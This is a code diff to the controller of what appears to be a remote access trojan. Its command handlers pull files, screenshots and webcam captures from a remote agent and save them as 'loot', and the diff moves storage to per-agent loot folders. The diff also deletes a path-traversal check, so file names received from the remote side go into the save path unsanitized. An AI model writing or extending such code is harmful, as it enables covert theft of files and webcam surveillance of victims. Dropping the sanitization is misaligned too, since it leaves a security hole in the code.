@@ -42,12 +42,8 @@ class DownloadCommand(ServerCommand):
     def execute(self, ctx, raw: str):
         remote_path = raw[9:].strip()
         ctx.protocol.send(raw)
-        os.makedirs(ctx.loot_dir, exist_ok=True)
         filename = os.path.basename(remote_path) or 'downloaded_file'
-        save_path = _sanitize_path(ctx.loot_dir, filename)
-        if save_path is None:
-            print_colored('[-] Path traversal blocked', 'red')
-            return True
+        save_path = os.path.join(ctx.agent_loot_dir, filename)
         download_file(ctx.protocol, save_path)
         return True
 
@@ -58,8 +54,7 @@ class ScreenshotCommand(ServerCommand):
 
     def execute(self, ctx, raw: str):
         ctx.protocol.send(raw)
-        os.makedirs(ctx.loot_dir, exist_ok=True)
-        save_path = os.path.join(ctx.loot_dir, f'screenshot{ctx.screenshot_count}.png')
+        save_path = os.path.join(ctx.agent_loot_dir, f'screenshot{ctx.screenshot_count}.png')
         ctx.screenshot_count += 1
         download_file(ctx.protocol, save_path)
         return True
@@ -71,8 +66,7 @@ class WebcamCommand(ServerCommand):
 
     def execute(self, ctx, raw: str):
         ctx.protocol.send(raw)
-        os.makedirs(ctx.loot_dir, exist_ok=True)
         timestamp = __import__('time').strftime('%Y%m%d_%H%M%S')
-        save_path = os.path.join(ctx.loot_dir, f'webcam_{timestamp}.png')
+        save_path = os.path.join(ctx.agent_loot_dir, f'webcam_{timestamp}.png')
         download_file(ctx.protocol, save_path)
         return True
